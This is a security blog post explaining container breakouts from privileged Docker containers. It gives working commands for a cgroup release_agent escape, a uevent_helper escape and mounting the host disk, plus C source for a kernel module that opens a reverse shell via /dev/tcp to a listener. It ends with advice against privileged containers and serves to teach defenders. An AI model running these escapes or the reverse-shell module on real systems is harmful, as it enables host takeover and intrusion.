---
title: "Container Breakouts – Part 2: Privileged Container"
date: 2020-07-21T15:42:19+02:00
draft: false
tags:
- docker
- breakout
- security
---


This post is part of a series and shows container breakout techniques that can be performed if a container is started privileged.

<!--more-->

The following posts are part of the series:
- [Part 1: Access to root directory of the Host](../container-breakouts-part1)
- Part 2: Privileged Container
- Part 3: Docker Socket (not yet published)

<!--
The following posts are part of the series:
- [Part 1: Access to root directory of the Host](../container-breakouts-part1)
- Part 2: Privileged Container
- [Part 3: Docker Socket](../container-breakouts-part3)
-->


## Intro

This is the second post of my container breakout series. After the discussion on how to escape from a system with access only to the root directory, we will now dive into the privileged container. The escalation itself is this time a bit more OpSec-safe then the previous, but still a bit noisy. The proposed techniques are now more container related, then the previous post.

## Privileged Container

If you start a container with Docker and you add the flag `--privileged` that means to the process in the container can act as root user on the host. The containerization would have the advantage of self-containing software deployment, but **no** real **security boundaries to** the **kernel** when started with that flag.

There are multiple ways to escape from a privileged container. Let us have a look...

### Capabilities

We will now explore two techniques that can be used to break out of the container. It is important to note here that it is only possible to abuse the [capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html), because there is no [seccop](https://man7.org/linux/man-pages/man2/seccomp.2.html) filter in place. This is the case if a container is started with `--privileged`. Docker containers are normally started with a seccomp filter enabled and give an additional layer of security.

The available capabilities inside the container can be printed with the command `capsh --print`. The details about each capability can be taken from the man page (`man capavilities`). In case of a privileged container, all capabilities are available. An example output looks like following:

```
# capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+eip
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

An alternative location to get details about the process capabilities can be taken from `/proc/self/status`, as following (thanks to [Chris le Roy](https://twitter.com/brompwnie) for one of the latest tweets):
```
user@ca719daf3844:~$ grep Cap /proc/self/status
CapInh:	0000003fffffffff
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000

user@ca719daf3844:~$ capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
```

A detailed summary of sensitive kernel capabilities can be taken from the forum [grsecurity](https://grsecurity.net/) post from spender [False Boundaries and Arbitrary Code Execution](https://forums.grsecurity.net/viewtopic.php?t=2522).

#### `CAP_SYS_ADMIN` – cgroup notify on release escape

One of the dangerous kernel capabilities is `CAP_SYS_ADMIN`. If you are acting in a container with this capability, you can manage cgroups of the system. As a short re-cap – [cgroups](https://man7.org/linux/man-pages/man7/cgroups.7.html) are used to manage the system resources for a container (that’s very brief – I know). 

In this escape, we use a **feature of cgroups** that allows the **execution** of code **in** the **root context**, after the last process in a cgroup is terminated. The feature is called **“notification on release”** and can only be set, because we have the capability `CAP_SYS_ADMIN`. 

This technique got popular after [Felix Wilhelm](https://twitter.com/_fel1x) from [Google Project Zero]( https://googleprojectzero.blogspot.com/) put the escape in one tweet. [Trail of Bits](https://www.trailofbits.com/) has even investigated further this topic and all details can be read in their blogpost [Understanding Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/). 

Here is just the quintessence of this approach:
1. Create a new cgroup
2. Create and activate “callback” with `notify_on_release`
3. Create an ephemeral process in new cgroup to trigger “callback”

The following commands are necessary to perform the attack:

```
# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/escape_cgroup

# echo 1 > /tmp/cgrp/escape_cgroup/notify_on_release
# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
# echo "$host_path/cmd" > /tmp/cgrp/release_agent

# echo '#!/bin/sh' > /cmd
# echo "ps aux | /sbin/tee $host_path/cmdout" >> /cmd
# chmod a+x /cmd

# sh -c "echo 0 > /tmp/cgrp/escape_cgroup/cgroup.procs" 
# sleep 1
# head /cmdout
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.1 108272 11216 ?        Ss   20:57   0:00 /sbin/init
root           2  0.0  0.0      0     0 ?        S    20:57   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        I<   20:57   0:00 [rcu_gp]
root           4  0.0  0.0      0     0 ?        I<   20:57   0:00 [rcu_par_gp]
root           6  0.0  0.0      0     0 ?        I<   20:57   0:00 [kworker/0:0H-kblockd]
root           7  0.0  0.0      0     0 ?        I    20:57   0:00 [kworker/u8:0-events_power_efficient]
root           8  0.0  0.0      0     0 ?        I<   20:57   0:00 [mm_percpu_wq]
root           9  0.0  0.0      0     0 ?        S    20:57   0:00 [ksoftirqd/0]
root          10  0.0  0.0      0     0 ?        S    20:57   0:00 [rcuc/0]
```

To by honest, this **technique** was in my setup **a bit flaky** and I had some issues while repeating it. Do not worry if it is not working on the first try.

#### `CAP_SYS_Module` – Load Kernel Module 

What do you need to **load a kernel module on a Unix host**? Exact, the right capability: `CAP_SYS_MODULE`. In advance, you **must** be in the **same process namespace as** the **init** process, but **that is default** in case of plain Docker setups. You think now _how dare you_ this is something nobody would do!? That is exactly what happened to _Play-with-Docker_. I recommend reading the post [How I Hacked Play-with-Docker and Remotely Ran Code on the Host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host) by [Nimrod Stoler](https://twitter.com/n1mr0d5) to get all insights and the full picture.

The exploitation cannot be that easily weaponized, because we need a **kernel module** that **fits** the **kernel version**. To do so, we need to **compile** our own **kernel module** for the host system kerne. I thought initially that’s an easy one, just _copy&paste_ the code, compile and finished. Sounds easy? It is not that easy if you have an Ubuntu container on an Archlinux host – sigh.

To perform the steps I had to cheat a bit. Previously, we have performed all steps from inside the container. This time, I will **pre-compile** the **kernel module outside** of the **container**. Why is that necessary in my case? Because I had issues to compile the kernel module for the Archlinux kernel inside an ubuntu container with the Ubuntu toolchain. I am not a kernel developer, so I dropped to dive into the issues and let someone with more expertise to deep-dive on that topic.

To **prepare** the **kernel module**, you **need** the **kernel headers** for the host that runs the container. You can find them while googling through the internet and search for the kernel version headers (kernel version can be identified by `uname -r`). Afterward, you need the _gcc_ compiler and _make_ and that’s it.

The following steps have been performed on a separate host (an ubuntu system).

```
# apt update && apt install -y gcc make linux-headers 

# cat << EOF > reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");
char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/172.17.0.2/1337 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}
module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
EOF

# cat Makefile
obj-m +=reverse-shell.o
all:
make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
clean:
make -C /lib/modules/$(uname -r)/build M=$(pwd) clean

# make

```

After the **kernel module** is **prepared**, the binary is **transferred to** the privileged **container**. This can be Base64-encoded (in my case 86 lines) or another transfer technique. With the binary transferred into the container, we can start in the **listener** for the **reverse shell**. 

**Terminal 1**

```
# nc -lvlp 1337
listening on [any] 1337 ...
```

Terminal 1 must be on a system that is accessible from the host, that serves the container. The listener can even be started inside the container.  If the listener is ready, the kernel module can be loaded, and the host will initiate the reverse shell.

**Terminal 2** 
```
# insmod reverse-shell.ko
```
And that’s it! 

**Terminal 1**

```
# nc -lvlp 1337
listening on [any] 1337 ...

172.17.0.1: inverse host lookup failed: Unknown host
connect to [172.17.0.2] from (UNKNOWN) [172.17.0.1] 55010
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
root@linux-box:/#
```

A more detailed explanation can be found here [Docker Container Breakout: Abusing SYS_MODULE capability!](https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd) by [Nishant Sharma](https://linkedin.com/in/wifisecguy/).


### Linux kernel Filesystem `/sys`

The Linux kernel offers access over the filesystem `/sys` direct access to the kernel. In case you are root – what we are in a privileged container – you can trigger events that got consumed and processed by the kernel. One of the interfaces is the `uevent_helper` which is a callback that is triggered as soon a new device is plugged in the system. The plugin a new device can be simulated as well by the `/sys` filesystem.

An example to execute commands on the host system is as follows:

1. Create “callback”
2. Link “callback”
3. Trigger “callback”

```
# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# cat << EOF > /trigger.sh
#!/bin/sh  
ps auxf > $host_path/output.txt
EOF

# chmod +x /trigger.sh 

# echo $host_path/trigger.sh > /sys/kernel/uevent_helper

# echo change > /sys/class/mem/null/uevent

# head /output.txt
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         2  0.0  0.0      0     0 ?        S    14:14   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        I    14:14   0:00  \_ [kworker/0:0]
root         4  0.0  0.0      0     0 ?        I<   14:14   0:00  \_ [kworker/0:0H]
root         5  0.0  0.0      0     0 ?        I    14:14   0:00  \_ [kworker/u4:0]
root         6  0.0  0.0      0     0 ?        I<   14:14   0:00  \_ [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S    14:14   0:00  \_ [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        I    14:14   0:00  \_ [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    14:14   0:00  \_ [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    14:14   0:00  \_ [migration/0]
``` 

As you can see, the script is executed and the output made available inside the container. 

_Remark: Thanks to [Matthias](https://twitter.com/uchi_mata) for the review and remembering me to add this breakout  technique!_

### Host Devices

If you are in a privileged container, the devices are not striped and namespaced. A quick directory **listing** of the **devices** in the container shows that we have **access to all** of them. Since we are `root` and have all capabilities, we can **mount** the **devices** that are plugged into the host – as well as the hard drive.  

Mounting the hard drive is giving us access to the host filesystem. 

```
root@0462216e684b:~# ls -l /dev/
[...]
brw-rw---- 1 root  994   8,   0 Jul 11 09:20 sda
brw-rw---- 1 root  994   8,   1 Jul 11 09:20 sda1
[...]

# mkdir /hostfs
# mount /dev/sda1 /hostfs
# ls -l /hostfs/
total 132
lrwxrwxrwx   1 root root     7 Nov 19  2019 bin -> usr/bin
drwxr-xr-x   4 root root  4096 May 13 13:29 boot
[...]
drwxr-xr-x 104 root root 12288 Jul 11 10:09 etc
drwxr-xr-x   4 root root  4096 Jun 30 14:47 home
[...]
drwxr-x---   9 root root  4096 Jul 11 10:09 root
[...]
lrwxrwxrwx   1 root root     7 Nov 19  2019 sbin -> usr/bin
[...]
drwxr-xr-x  10 root root  4096 May 26 14:37 usr
[...]
```

Escalating the access to the root directory of the host is already described in the **previous part** of the series [Part 1: Access to root directory of the Host](../container-breakouts-part1).

## Conclusion

We have seen three approaches that can be used if a Unix container is started with an insecure configuration. 

The main take away message is that one should **be careful if** a **container must** be **started** in **privileged** mode. Ether it is one of the management components that are needed for controlling the container host system or a malicious agenda. **Never start a container privileged if it is not necessary** and review carefully the additional capabilities that a container might require.

Now you know why we discussed the breakout techniques with access to the root directory, before I discussed the access to the host devices.

If you are interested in how to use the Docker socket to get out of the container, stay tuned for the next blog post of the series _**Part 3: Docker Socket**_.

<!--
If you are interested in how to use the Docker socket to get out of the container, continue with the next post [Part 3: Docker Socket](../container-breakouts-part3).
-->


